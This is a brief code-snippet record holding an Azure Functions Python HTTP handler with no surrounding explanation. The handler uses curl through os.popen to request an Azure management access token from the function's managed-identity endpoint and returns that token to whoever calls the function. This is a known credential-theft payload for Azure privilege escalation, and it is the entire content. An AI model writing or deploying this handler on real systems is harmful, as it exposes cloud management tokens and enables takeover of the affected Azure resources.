---
id: 62bbd479-f676-4da5-a544-39a1c12ce1dd
type: code
language: Python
verified: false
created_at: '2023-05-24T16:03:55.092939+00:00'
updated_at: '2023-05-24T16:04:41.661228+00:00'
---

# Code Snippet 62bbd479

**Language**: Python

```python
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```


